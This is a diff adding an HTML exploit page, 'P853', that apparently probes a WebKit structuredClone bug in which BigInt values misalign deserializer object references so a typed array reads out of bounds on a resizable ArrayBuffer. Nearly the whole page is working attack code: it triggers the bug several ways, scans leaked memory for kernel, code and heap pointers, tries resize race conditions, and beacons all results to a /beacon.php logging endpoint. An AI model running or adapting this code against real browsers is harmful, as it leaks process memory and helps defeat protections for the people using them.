@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P853</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P853: RAB Pool Mismatch — BigInt BEFORE Buffers</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P853-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+bn('BOOT','start');
+log('RAB pool mismatch — BigInt BEFORE buffers (p285 correct ordering)','info');
+log('','');
+
+/* ===================================================================
+   The p285 bug (WebKit bug 265975):
+   - Serializer: objectPool tracks objects. BigInt NOT added to objectPool.
+   - Deserializer: uses m_gcBuffer for BOTH objects AND BigInts.
+   - BigInt BEFORE buffers → shifts all subsequent gcBuffer indices by 1.
+   - Float64Array/BigUint64Array refs pool[N] → gcBuffer[N] is now wrong!
+   - RAB skips verifySubRangeLength → OOB!
+   =================================================================== */
+
+/* ===================================================================
+   TEST A: Array ordering — BigInt at [0], small at [1], large at [2], view at [3]
+   Serializer pool: [arr=0, small=1, large=2]
+   View refs large → ObjectRef(2)
+   With BigInt shift: gcBuffer = [arr, BIGINT, small, large, view]
+   ObjectRef(2) → gcBuffer[2] = small (SHIFTED!)
+   =================================================================== */
+log('--- TEST A: Array [bigint, small_rab, large_rab, F64A(large)] ---','hot');
+bn('A-PRE','start');
+try{
+  var sA=new ArrayBuffer(8,{maxByteLength:64});
+  var lA=new ArrayBuffer(8192,{maxByteLength:16384});
+  /* Fill large with marker data */
+  var lAv=new Float64Array(lA);
+  for(var i=0;i<1024;i++)lAv[i]=i+0.5;
+  var arrA=[42n, sA, lA, new Float64Array(lA)];
+  var outA=structuredClone(arrA);
+  var rA='v.len='+outA[3].length+'|v.buf.bl='+outA[3].buffer.byteLength;
+  if(outA[3].buffer.byteLength<outA[3].length*8){
+    log('  *** OOB DETECTED! buf='+outA[3].buffer.byteLength+' < need '+(outA[3].length*8)+' ***','hot');
+    rA+='|OOB=TRUE';
+    /* Read OOB data via BigUint64Array on the same buffer */
+    try{
+      var buA=new BigUint64Array(outA[3].buffer);
+      var oobData=[];
+      for(var i=0;i<Math.min(buA.length,64);i++){
+        if(buA[i]!==0n)oobData.push('q'+i+'='+hexQ(buA[i]));
+      }
+      rA+='|nz='+oobData.length;
+      log('  OOB data ('+oobData.length+' nonzero):','hot');
+      for(var i=0;i<Math.min(oobData.length,20);i++)log('    '+oobData[i],'hot');
+      bn('A-OOB',oobData.slice(0,30).join('|'));
+    }catch(e){rA+='|bu64err='+e.message.slice(0,40);}
+  }else{
+    /* Check if data matches expected (view on large_rab) */
+    var match=outA[3][0]===0.5&&outA[3][1]===1.5;
+    rA+='|match='+match;
+    log('  No mismatch (buf='+outA[3].buffer.byteLength+', match='+match+')','info');
+  }
+  log('  A: '+rA,'info');
+  bn('A',rA);
+}catch(e){
+  log('  A THREW: '+e.message.slice(0,120),'fail');
+  bn('A','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   TEST B: Object ordering — {bn: bigint, s: small, l: large, v: view}
+   Property enumeration order = insertion order for string keys
+   =================================================================== */
+log('','');
+log('--- TEST B: Object {bn:BigInt, s:small, l:large, v:F64A(large)} ---','hot');
+bn('B-PRE','start');
+try{
+  var sB=new ArrayBuffer(8,{maxByteLength:64});
+  var lB=new ArrayBuffer(8192,{maxByteLength:16384});
+  var lBv=new Float64Array(lB);
+  for(var i=0;i<1024;i++)lBv[i]=i+0.25;
+  var objB={bn:42n, s:sB, l:lB, v:new Float64Array(lB)};
+  var outB=structuredClone(objB);
+  var rB='v.len='+outB.v.length+'|v.buf.bl='+outB.v.buffer.byteLength;
+  if(outB.v.buffer.byteLength<outB.v.length*8){
+    log('  *** OOB DETECTED! ***','hot');
+    rB+='|OOB=TRUE';
+    try{
+      var buB=new BigUint64Array(outB.v.buffer);
+      var oobB=[];
+      for(var i=0;i<Math.min(buB.length,64);i++){
+        if(buB[i]!==0n)oobB.push('q'+i+'='+hexQ(buB[i]));
+      }
+      rB+='|nz='+oobB.length;
+      bn('B-OOB',oobB.slice(0,30).join('|'));
+    }catch(e){rB+='|err='+e.message.slice(0,40);}
+  }else{
+    var matchB=outB.v[0]===0.25&&outB.v[1]===1.25;
+    rB+='|match='+matchB;
+  }
+  log('  B: '+rB,'info');
+  bn('B',rB);
+}catch(e){
+  log('  B THREW: '+e.message.slice(0,120),'fail');
+  bn('B','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   TEST C: Multiple BigInts for larger shift
+   3 BigInts → shift by 3
+   =================================================================== */
+log('','');
+log('--- TEST C: 3 BigInts before buffers (shift by 3) ---','hot');
+bn('C-PRE','start');
+try{
+  var sC=new ArrayBuffer(8,{maxByteLength:64});
+  var lC=new ArrayBuffer(8192,{maxByteLength:16384});
+  var lCv=new Float64Array(lC);
+  for(var i=0;i<1024;i++)lCv[i]=i*2.0;
+  var arrC=[1n, 2n, 3n, sC, lC, new Float64Array(lC)];
+  var outC=structuredClone(arrC);
+  /* View is at arrC[5], refs large (originally pool[4] in serializer but depends on outer array) */
+  var rC='v.len='+outC[5].length+'|v.buf.bl='+outC[5].buffer.byteLength;
+  if(outC[5].buffer.byteLength<outC[5].length*8){
+    log('  *** OOB DETECTED! shift=3 ***','hot');
+    rC+='|OOB=TRUE';
+  }else{
+    var matchC=outC[5][0]===0.0&&outC[5][1]===2.0;
+    rC+='|match='+matchC;
+  }
+  log('  C: '+rC,'info');
+  bn('C',rC);
+}catch(e){
+  log('  C THREW: '+e.message.slice(0,120),'fail');
+  bn('C','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   TEST D: BigUint64Array instead of Float64Array (DAZ-free reads!)
+   =================================================================== */
+log('','');
+log('--- TEST D: BigUint64Array view (DAZ-free!) ---','hot');
+bn('D-PRE','start');
+try{
+  var sD=new ArrayBuffer(8,{maxByteLength:64});
+  var lD=new ArrayBuffer(8192,{maxByteLength:16384});
+  /* Write markers via DataView */
+  var dvD=new DataView(lD);
+  for(var i=0;i<1024;i++)dvD.setBigUint64(i*8,BigInt(0xDEAD0000+i),true);
+  var arrD=[42n, sD, lD, new BigUint64Array(lD)];
+  var outD=structuredClone(arrD);
+  var rD='v.len='+outD[3].length+'|v.buf.bl='+outD[3].buffer.byteLength;
+  if(outD[3].buffer.byteLength<outD[3].length*8){
+    log('  *** OOB with BigUint64Array! ***','hot');
+    rD+='|OOB=TRUE';
+    var oobD=[];
+    for(var i=0;i<Math.min(outD[3].length,128);i++){
+      var v=outD[3][i];
+      if(v!==0n)oobD.push('q'+i+'='+hexQ(v));
+    }
+    rD+='|nz='+oobD.length;
+    log('  Nonzero vals: '+oobD.length,'hot');
+    /* Look for kernel/code pointers */
+    var kptrs=[], cptrs=[], hptrs=[];
+    for(var i=0;i<Math.min(outD[3].length,128);i++){
+      var v=outD[3][i];
+      var hi=Number(v>>32n);
+      if(hi>=0xFFFF8000)kptrs.push('q'+i+'='+hexQ(v));
+      else if(hi>=0x00000050&&hi<=0x00000060)cptrs.push('q'+i+'='+hexQ(v));
+      else if(hi>=0x00000010&&hi<=0x0000001F)hptrs.push('q'+i+'='+hexQ(v));
+    }
+    if(kptrs.length)log('  KERNEL PTRS: '+kptrs.join(', '),'hot');
+    if(cptrs.length)log('  CODE PTRS: '+cptrs.join(', '),'hot');
+    if(hptrs.length)log('  HEAP PTRS: '+hptrs.slice(0,10).join(', '),'hot');
+    bn('D-OOB','nz='+oobD.length+'|k='+kptrs.length+'|c='+cptrs.length+'|h='+hptrs.length+'|'+oobD.slice(0,15).join('|'));
+  }else{
+    var matchD=outD[3][0]===BigInt(0xDEAD0000);
+    rD+='|match='+matchD;
+    log('  No mismatch','info');
+  }
+  log('  D: '+rD,'info');
+  bn('D',rD);
+}catch(e){
+  log('  D THREW: '+e.message.slice(0,120),'fail');
+  bn('D','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   TEST E: Nested object — BigInt in nested, buffers at top
+   Different serialization path
+   =================================================================== */
+log('','');
+log('--- TEST E: Nested {inner:{bn:BigInt}, s:small, l:large, v:view} ---','hot');
+bn('E-PRE','start');
+try{
+  var sE=new ArrayBuffer(8,{maxByteLength:64});
+  var lE=new ArrayBuffer(8192,{maxByteLength:16384});
+  /* Serialization order: outer obj → inner obj → bn (BigInt) → s → l → v */
+  var objE={inner:{bn:42n}, s:sE, l:lE, v:new Float64Array(lE)};
+  var outE=structuredClone(objE);
+  var rE='v.len='+outE.v.length+'|v.buf.bl='+outE.v.buffer.byteLength;
+  if(outE.v.buffer.byteLength<outE.v.length*8){
+    log('  *** OOB via nested object! ***','hot');
+    rE+='|OOB=TRUE';
+  }
+  log('  E: '+rE,'info');
+  bn('E',rE);
+}catch(e){
+  log('  E THREW: '+e.message.slice(0,120),'fail');
+  bn('E','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   TEST F: Non-RAB control — same structure but plain ArrayBuffer
+   If the mismatch happens with RAB but NOT plain AB, it's the RAB skip
+   =================================================================== */
+log('','');
+log('--- TEST F: Plain AB control (no RAB) ---','hot');
+bn('F-PRE','start');
+try{
+  var sF=new ArrayBuffer(8); /* NOT resizable */
+  var lF=new ArrayBuffer(8192);
+  var lFv=new Float64Array(lF);
+  for(var i=0;i<1024;i++)lFv[i]=i+0.75;
+  var arrF=[42n, sF, lF, new Float64Array(lF)];
+  var outF=structuredClone(arrF);
+  var rF='v.len='+outF[3].length+'|v.buf.bl='+outF[3].buffer.byteLength;
+  if(outF[3].buffer.byteLength<outF[3].length*8){
+    log('  *** OOB even without RAB! ***','hot');
+    rF+='|OOB=TRUE';
+  }else{
+    var matchF=outF[3][0]===0.75;
+    rF+='|match='+matchF;
+  }
+  log('  F: '+rF,'info');
+  bn('F',rF);
+}catch(e){
+  log('  F THREW: '+e.message.slice(0,120),'fail');
+  bn('F','ERR|'+e.message.slice(0,300));
+}
+
+/* ===================================================================
+   TEST G: RAB TOCTOU — sort with resize in comparator
+   =================================================================== */
+log('','');
+log('--- TEST G: RAB sort + resize TOCTOU ---','hot');
+bn('G-PRE','start');
+try{
+  var rabG=new ArrayBuffer(1024,{maxByteLength:4096});
+  var taG=new Float64Array(rabG);
+  for(var i=0;i<128;i++)taG[i]=128-i;
+  var gResized=false;
+  taG.sort(function(a,b){
+    if(!gResized){
+      gResized=true;
+      try{rabG.resize(8);}catch(e){}
+    }
+    return a-b;
+  });
+  var rG='resized='+gResized+'|bl='+rabG.byteLength+'|ta.len='+taG.length;
+  /* Check if sort accessed stale data */
+  var gAno=0;
+  for(var i=0;i<Math.min(taG.length,8);i++){
+    if(taG[i]!==taG[i])gAno++; /* NaN check */
+  }
+  rG+='|nan='+gAno;
+  log('  G: '+rG,'info');
+  bn('G',rG);
+}catch(e){
+  log('  G THREW: '+e.message.slice(0,120),'fail');
+  bn('G','ERR|'+e.message.slice(0,200));
+}
+
+/* ===================================================================
+   TEST H: RAB set() with resize in source length getter
+   =================================================================== */
+log('','');
+log('--- TEST H: RAB set + resize in source.length ---','hot');
+bn('H-PRE','start');
+try{
+  var rabH=new ArrayBuffer(1024,{maxByteLength:4096});
+  var taH=new Uint8Array(rabH);
+  for(var i=0;i<1024;i++)taH[i]=0xAA;
+  var hResized=false;
+  var src={
+    length:512,
+    0:0x41,1:0x42,2:0x43
+  };
+  /* Override length with getter that resizes */
+  Object.defineProperty(src,'length',{
+    get:function(){
+      if(!hResized){hResized=true;try{rabH.resize(8);}catch(e){}}
+      return 512;
+    }
+  });
+  try{taH.set(src);}catch(e){}
+  var rH='resized='+hResized+'|bl='+rabH.byteLength;
+  /* Check what's in the buffer now */
+  var hNonAA=0;
+  var hView=new Uint8Array(rabH);
+  for(var i=0;i<hView.length;i++){
+    if(hView[i]!==0xAA&&hView[i]!==0)hNonAA++;
+  }
+  rH+='|nonAA='+hNonAA+'|viewLen='+hView.length;
+  log('  H: '+rH,'info');
+  bn('H',rH);
+}catch(e){
+  log('  H THREW: '+e.message.slice(0,120),'fail');
+  bn('H','ERR|'+e.message.slice(0,200));
+}
+
+/* ===================================================================
+   TEST I: DataView on RAB + resize before read
+   =================================================================== */
+log('','');
+log('--- TEST I: DataView on RAB + resize ---','hot');
+bn('I-PRE','start');
+try{
+  var rabI=new ArrayBuffer(256,{maxByteLength:4096});
+  var dvI=new DataView(rabI);
+  /* Write markers */
+  for(var i=0;i<32;i++)dvI.setBigUint64(i*8,BigInt(0xCAFE0000+i),true);
+  /* Resize to 4096 */
+  rabI.resize(4096);
+  /* Read beyond original 256 bytes */
+  var iData=[];
+  for(var i=32;i<64;i++){
+    var v=dvI.getBigUint64(i*8,true);
+    if(v!==0n)iData.push('q'+i+'='+hexQ(v));
+  }
+  var rI='expanded='+rabI.byteLength+'|beyond256nz='+iData.length;
+  if(iData.length>0){
+    log('  Data beyond original 256B: '+iData.slice(0,5).join(', '),'hot');
+  }else{
+    log('  Beyond 256B: all zeros (expected — maxByteLength pre-allocated and zeroed)','info');
+  }
+  log('  I: '+rI,'info');
+  bn('I',rI);
+}catch(e){
+  log('  I THREW: '+e.message.slice(0,120),'fail');
+  bn('I','ERR|'+e.message.slice(0,200));
+}
+
+log('','');
+log('====== P853 COMPLETE ======','hot');
+bn('DONE','complete');
+</script></body></html>
